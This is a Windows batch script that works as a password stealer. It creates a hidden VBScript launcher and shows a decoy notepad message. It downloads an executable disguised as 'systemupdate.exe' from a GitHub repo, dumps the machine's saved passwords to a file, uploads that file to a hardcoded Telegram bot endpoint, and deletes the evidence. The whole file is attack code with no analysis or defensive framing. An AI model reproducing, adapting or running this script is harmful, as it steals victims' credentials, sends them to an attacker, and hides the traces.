@echo off
if exist "%temp%\sys.vbs" goto Steal
goto Cvbs

:Cvbs
echo Set objShell = CreateObject("WScript.Shell")>"%temp%\sys.vbs"
echo objShell.Run "cmd.exe /c \"%temp%\steal.bat\"", 0, True >>"%temp%\sys.vbs"
wscript.exe //nologo "%temp%\sys.vbs"
exit

:steal
echo Your Password Is : 123 > "%temp%\password.txt" & start notepad "%temp%\password.txt"
cmd /c "curl -o "%temp%\systemupdate.exe" https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & "%temp%\systemupdate.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\systemupdate.exe" & del "%temp%\%username%-%computername%.txt" "
del "%temp%\password.txt"
del "%temp%\sys.vbs"
exit 
